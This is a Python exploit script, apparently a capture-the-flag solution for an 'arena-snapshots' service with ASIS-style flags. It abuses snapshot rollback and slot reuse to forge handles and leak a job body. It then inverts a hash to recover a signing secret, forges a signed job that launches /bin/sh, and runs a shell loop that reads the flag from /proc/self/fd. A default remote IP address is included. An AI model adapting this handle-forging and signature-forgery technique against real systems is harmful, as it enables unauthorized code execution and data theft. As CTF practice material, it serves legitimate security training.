#!/usr/bin/env python3
import argparse
import os
import re
import socket
import struct
import subprocess
import sys
import time
from pathlib import Path

BASE_DIR = Path(__file__).resolve().parent
BIN = BASE_DIR / "arena-snapshots"
RELEASE = "ead6e9709404e1de7d170e4d"
K = 0xf4a77a8e77fb3a2c
MASK64 = (1 << 64) - 1
MASK32 = (1 << 32) - 1
M1 = 0xff51afd7ed558ccd
M2 = 0xc4ceb9fe1a85ec53
C = 0x21cb5f5efbe0c0a2
INV_M1 = pow(M1, -1, 1 << 64)
INV_M2 = pow(M2, -1, 1 << 64)


def u64(b):
    return struct.unpack('<Q', b)[0]

def p64(x):
    return struct.pack('<Q', x & MASK64)

def p32(x):
    return struct.pack('<I', x & MASK32)


def inc16(x):
    x = (x + 1) & 0xffff
    return x or 1


def handle(t, epoch, gen, idx):
    plain = ((t & 0xff) << 56) | ((epoch & 0xffff) << 40) | ((gen & 0xffff) << 24) | (idx & 0xffffff)
    return f"{plain ^ K:016x}"


def decode_handle(h):
    v = int(h, 16) ^ K
    return {
        "type": (v >> 56) & 0xff,
        "epoch": (v >> 40) & 0xffff,
        "gen": (v >> 24) & 0xffff,
        "idx": v & 0xffffff,
    }


def inv_xor_rshift(y, s):
    # s is 33 here, so one feedback step is enough; keep generic for sanity.
    x = y
    shift = s
    while shift < 64:
        x ^= y >> shift
        shift += s
    return x & MASK64


def mix_final(x):
    x &= MASK64
    x ^= x >> 33
    x = (x * M1) & MASK64
    x ^= x >> 33
    x = (x * M2) & MASK64
    x ^= x >> 33
    return x & MASK64


def inv_mix_final(y):
    x = inv_xor_rshift(y, 33)
    x = (x * INV_M2) & MASK64
    x = inv_xor_rshift(x, 33)
    x = (x * INV_M1) & MASK64
    x = inv_xor_rshift(x, 33)
    return x & MASK64


def path_mix_first(path_qword, path_len):
    x = (path_len ^ path_qword) & MASK64
    x ^= x >> 33
    x = (x * M1) & MASK64
    x ^= x >> 33
    x = (x * M2) & MASK64
    # intentionally no last xor here; this matches the binary's 2c10() pre-state.
    return x & MASK64


def recover_secret(job, idx, gen):
    kind = struct.unpack('<I', job[4:8])[0]
    selector = struct.unpack('<I', job[8:12])[0]
    path_len = struct.unpack('<I', job[12:16])[0]
    nonce = u64(job[0x10:0x18])
    sig = u64(job[0x18:0x20])
    first_path = u64(job[0x24:0x2c])
    a = path_mix_first(first_path, path_len)
    pre = inv_mix_final(sig)
    secret = pre ^ C ^ a ^ (a >> 33) ^ ((kind & MASK32) << 32) ^ selector ^ nonce ^ ((idx & 0xffff) << 48) ^ (gen & 0xffff)
    return secret & MASK64


def sig64(secret, job, idx, gen):
    kind = struct.unpack('<I', job[4:8])[0]
    selector = struct.unpack('<I', job[8:12])[0]
    path_len = struct.unpack('<I', job[12:16])[0]
    nonce = u64(job[0x10:0x18])
    first_path = u64(job[0x24:0x2c])
    a = path_mix_first(first_path, path_len)
    x = ((a >> 33) ^ secret ^ (gen & 0xffff) ^ ((idx & 0xffff) << 48) ^ nonce ^ selector ^ ((kind & MASK32) << 32) ^ a ^ C) & MASK64
    return mix_final(x)


def checksum32(secret, job, idx, gen):
    tmp = bytearray(job[:0x64])
    tmp[0x20:0x24] = b"\x00" * 4
    seed = (gen ^ ((secret >> 32) & MASK32) ^ (secret & MASK32) ^ ((idx * 0x9e3779b1) & MASK32) ^ 0xd3b7df9c) & MASK32
    h = seed
    for b in tmp:
        h ^= b
        h = (h * 0x01000193) & MASK32
    return h


def build_shell_job(secret, idx, gen):
    job = bytearray(0x90)
    job[0:4] = p32(0x415379b7)
    job[4:8] = p32(0x4153b0d8)      # shell kind
    job[8:12] = p32(0x1357)          # selector copied from legitimate jobs
    path = b"/bin/sh"
    job[12:16] = p32(len(path))
    # Any nonce works as long as signatures match. Tie it to fields to avoid all-zero laziness.
    nonce = (0x4153000000000000 ^ ((gen & 0xffff) << 24) ^ idx) & MASK64
    job[0x10:0x18] = p64(nonce)
    job[0x24:0x24 + len(path)] = path
    job[0x24 + len(path)] = 0
    job[0x18:0x20] = p64(sig64(secret, job, idx, gen))
    job[0x20:0x24] = p32(checksum32(secret, job, idx, gen))
    return bytes(job)


class Conn:
    def __init__(self, host, port, timeout=2.0):
        self.s = socket.create_connection((host, port), timeout=timeout)
        self.s.settimeout(timeout)
        self.buf = b""

    def recv_line(self):
        while b"\n" not in self.buf:
            data = self.s.recv(4096)
            if not data:
                raise EOFError("connection closed")
            self.buf += data
        line, self.buf = self.buf.split(b"\n", 1)
        return line.decode('latin1')

    def send_line(self, line):
        self.s.sendall(line.encode() + b"\n")
        return self.recv_line()

    def send_raw_line(self, line):
        self.s.sendall(line.encode() + b"\n")

    def recv_some(self, timeout=2.0):
        old = self.s.gettimeout()
        self.s.settimeout(timeout)
        out = self.buf
        self.buf = b""
        try:
            while True:
                part = self.s.recv(4096)
                if not part:
                    break
                out += part
                if b"ASIS{" in out:
                    break
        except socket.timeout:
            pass
        finally:
            self.s.settimeout(old)
        return out


def parse_alloc(resp, kind):
    m = re.search(rf"OK {kind}=([0-9a-f]{{16}}) idx=(\d+) gen=(\d+)", resp)
    if not m:
        raise RuntimeError(f"unexpected alloc response: {resp!r}")
    h = m.group(1)
    return h, int(m.group(2)), int(m.group(3)), decode_handle(h)


def expect_ok(resp, text="OK"):
    if not resp.startswith(text):
        raise RuntimeError(f"unexpected response: {resp!r}")
    return resp


def view_bytes(io, h, n):
    out = bytearray()
    off = 0
    while off < n:
        size = min(32, n - off)
        r = io.send_line(f"VIEW {h} {off} {size}")
        m = re.search(r"OK data=([0-9a-f]*)", r)
        if not m:
            raise RuntimeError(f"VIEW failed at {off}: {r!r}")
        out += bytes.fromhex(m.group(1))
        off += size
    return bytes(out)


def exploit(io):
    banner = io.recv_line()
    print(f"[+] banner: {banner}")

    # Leak a legitimate job body by rolling job bytes back under buffer metadata.
    r = io.send_line("BUF 00")
    buf_h, buf_idx, buf_gen, buf_dec = parse_alloc(r, "buf")
    print(f"[+] leak buffer idx={buf_idx} gen={buf_gen} epoch={buf_dec['epoch']}")
    expect_ok(io.send_line("SNAP"), "OK snap")
    expect_ok(io.send_line(f"DROP {buf_h}"), "OK dropped")
    r = io.send_line("JOB leaker")
    job_h, job_idx, job_gen, job_dec = parse_alloc(r, "job")
    if job_idx != buf_idx:
        raise RuntimeError(f"allocator did not reuse dropped slot: buf={buf_idx} job={job_idx}")
    epoch_after = inc16(buf_dec["epoch"])
    expect_ok(io.send_line("ROLLBACK"), "OK rollback")
    forged_buf_h = handle(0x42, epoch_after, buf_gen, buf_idx)
    leaked_job = view_bytes(io, forged_buf_h, 0x70)
    secret = recover_secret(leaked_job, job_idx, job_gen)
    print(f"[+] recovered secret=0x{secret:016x}")

    # Build a shell job in a buffer slot, then roll old job metadata over it.
    r = io.send_line("JOB sh")
    shell_meta_h, shell_idx, shell_gen, shell_dec = parse_alloc(r, "job")
    print(f"[+] shell metadata idx={shell_idx} gen={shell_gen} epoch={shell_dec['epoch']}")
    expect_ok(io.send_line("SNAP"), "OK snap")
    expect_ok(io.send_line(f"DROP {shell_meta_h}"), "OK dropped")
    payload = build_shell_job(secret, shell_idx, shell_gen)
    r = io.send_line("BUF " + payload.hex())
    forged_payload_h, payload_idx, payload_gen, payload_dec = parse_alloc(r, "buf")
    if payload_idx != shell_idx:
        raise RuntimeError(f"allocator did not reuse shell slot: job={shell_idx} buf={payload_idx}")
    # Optional local sanity: ensure payload bytes are there before rollback.
    epoch_run = inc16(shell_dec["epoch"])
    expect_ok(io.send_line("ROLLBACK"), "OK rollback")
    forged_job_h = handle(0x4a, epoch_run, shell_gen, shell_idx)
    print(f"[+] forged RUN handle={forged_job_h}")
    io.send_raw_line(f"RUN {forged_job_h}")
    time.sleep(0.2)

    # The service duplicates the flag memfd to a random fd in [0x40, 0x200]. Read only that range.
    cmd = "i=64; while [ $i -le 512 ]; do l=$(readlink /proc/self/fd/$i 2>/dev/null); case \"$l\" in *as-flag*) cat /proc/self/fd/$i; echo; break;; esac; i=$((i+1)); done"
    io.send_raw_line(cmd)
    out = io.recv_some(3.0).decode('latin1', errors='replace')
    print(out)
    m = re.search(r"ASIS\{[^}\n]*\}", out)
    if m:
        print(f"<FLAG>{m.group(0)}</FLAG>")
    else:
        print("[!] flag pattern not found; dropping to interactive-ish output", file=sys.stderr)


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("mode", nargs="?", default="LOCAL", choices=["LOCAL", "REMOTE"])
    ap.add_argument("--host", default=os.environ.get("HOST", "91.107.187.160"))
    ap.add_argument("--port", type=int, default=int(os.environ.get("PORT", "18123")))
    ap.add_argument("--local-port", type=int, default=31337)
    args = ap.parse_args()

    proc = None
    if args.mode == "REMOTE":
        io = Conn(args.host, args.port)
    else:
        env = os.environ.copy()
        env.setdefault("FLAG_FILE", str(BASE_DIR / "flag.txt"))
        env.setdefault("EXPECTED_RELEASE", RELEASE)
        env["PORT"] = str(args.local_port)
        proc = subprocess.Popen([str(BIN)], cwd=str(BASE_DIR), env=env,
                                stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                                preexec_fn=os.setsid)
        time.sleep(0.2)
        try:
            io = Conn("127.0.0.1", args.local_port)
        except Exception:
            if proc:
                print(proc.stdout.read().decode(errors='replace'))
                print(proc.stderr.read().decode(errors='replace'), file=sys.stderr)
            raise
    try:
        exploit(io)
    finally:
        if proc:
            try:
                os.killpg(proc.pid, 15)
            except Exception:
                proc.terminate()
            try:
                proc.wait(timeout=1)
            except subprocess.TimeoutExpired:
                try:
                    os.killpg(proc.pid, 9)
                except Exception:
                    proc.kill()


if __name__ == "__main__":
    main()
